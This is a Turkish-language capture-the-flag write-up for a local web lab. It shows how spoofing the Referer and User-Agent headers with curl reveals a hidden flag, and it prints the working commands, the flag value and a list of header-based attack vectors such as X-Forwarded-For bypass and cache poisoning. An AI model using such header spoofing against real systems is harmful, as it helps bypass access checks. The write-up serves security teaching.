# Header Manipulation

Bu tür güvenlik sorunlarını önlemek için, sunucu isteğin başlıklarına dayanarak yüksek riskli doğrulama yapmamalıdır. Özellikle kimlik doğrulama veya hassas işlemler için HTTP başlıkları güvenilir bir doğrulama mekanizması değildir, çünkü bunlar kolayca değiştirilebilir.

Analitiğinizi korumak için kullandığınız hizmete bağlı olarak:
- Sadece insan tarafından okunabilir yönlendiricilere izin veren `regex` oluşturabilirsiniz
- Bilinen `Hayalet Trafik` yönlendiricilerini engelleyen bir kara liste oluşturabilirsiniz

Bu açık, sunucu tarafında HTTP başlıklarına aşırı güvenmenin tehlikelerini göstermektedir. İstek başlıkları her zaman istemci tarafından manipüle edilebilir ve güvenlik önlemleri olarak kullanılmamalıdır.

## HTTP Header Manipulation Ataklarına Kısa Bakış

HTTP Header Manipulation saldırıları, bir saldırganın HTTP istek veya yanıt başlıklarını değiştirerek çeşitli güvenlik sorunlarına yol açabildiği saldırı türleridir:

1. **Request Header Manipulation**: İstek başlıklarının değiştirilmesi
   - `Referer` başlığının değiştirilmesi (bu örnekteki gibi)
   - `User-Agent` başlığının değiştirilmesi (bu örnekteki gibi)
   - `X-Forwarded-For` başlığının IP adresi kısıtlamalarını atlatmak için değiştirilmesi
   - `Cookie` başlıklarının saldırıları gerçekleştirmek için değiştirilmesi

2. **Response Header Manipulation**: Yanıt başlıklarının değiştirilmesi
   - `X-Frame-Options`'ın bozulması ile clickjacking saldırıları
   - `Content-Security-Policy` başlığının atlatılması
   - `Access-Control-Allow-Origin` ile CORS politikalarının ihlali

3. **En Yaygın Saldırı Vektörleri**:
   - Sahte oturum bilgileri ile yetkilendirme atlatma
   - Cache zehirleme (Cache Poisoning)
   - Yönlendirme saldırıları (HTTP-Header-Based Redirection)
   - İstemci kimliğini ve kaynağını sahteleştirme

Bu tür saldırılardan korunmak için, sunucu tarafında başlıklara güvenmemeli, kullanıcı girdilerini her zaman doğrulamalı ve güvenlik kararlarını başlık değerlerine dayanarak almamalıyız.

## Güvenlik Açığını Nasıl Bulduk

`http://127.0.0.1:8080/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f` sayfasını incelediğimizde, şüpheli HTML yorumları bulduk:

```html
<!--
You must come from : "https://www.nsa.gov/".
-->
<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```

İlk yorum, belirli bir URL'den geldiğimizi göstermemiz gerektiğini söylüyor. Bunu denemeye karar verdik.

## Özel curl Referrer Başlığı

İsteklerimizi gerçekleştirmek için `curl` kullandık. `curl --header "Header_foo: bar"` komutuyla özel başlık anahtar-değer çiftleri tanımlayabiliriz.

Önce `Referer` başlığını `curl --header "Referer: https://www.nsa.gov/" url` komutuyla denedik:

```bash
diff <(curl --silent "http://127.0.0.1:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f") <(curl --silent --header "Referer: https://www.nsa.gov/" "http://127.0.0.1:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f")
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> FIRST STEP DONE<audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```

Gördüğümüz gibi, sunucu farklı bir sayfa içeriği gönderdi: `FIRST STEP DONE`

İkinci şüpheli yorum bir tarayıcıdan bahsediyor, bu yüzden `User-Agent` başlığıyla oynamayı denedik.

## Özel curl User-Agent Başlığı

Önceki komutumuza user agent için özel bir başlık ekledik: `curl --header "User-Agent: ft_bornToSec"`.

```bash
diff <(curl --silent "http://127.0.0.1:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f") <(curl --silent --header "Referer: https://www.nsa.gov/" --header "User-Agent: ft_bornToSec" "http://127.0.0.1:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f")
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> <center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```

İşte sonuç! Döndürülen sayfada flag'i bulduk!

## Bu Açığı Kendi Sistemimizde Çalıştırma

Aşağıdaki komutla açığı sömürebilirsiniz:

```bash
# Sadece Referer başlığı ile deneme
curl --silent --header "Referer: https://www.nsa.gov/" "http://127.0.0.1:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"

# Hem Referer hem User-Agent başlığı ile (flag'i gösterir)
curl --silent --header "Referer: https://www.nsa.gov/" --header "User-Agent: ft_bornToSec" "http://127.0.0.1:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
```

## Güvenlik Açığını Nasıl Kullanılır

Eğer sunucu, gelen isteğin başlıklarına göre doğrulama yapıyorsa ve bu doğrulama önemli işlemlere (işlem veya kimlik doğrulama gibi) yol açıyorsa, bu oldukça riskli olabilir.

Daha gerçekçi bir saldırı örneği, bir web sitesine sahte bir `Referer` başlığıyla (curl kullanarak) istekler göndermektir. Bu başlık, web siteleri tarafından kullanıcıların nereden geldiğini izlemek için kullanılır. Bir saldırgan, istatistikleri bozabilir ve bu da iş kararlarını yanlış yönlendirebilir.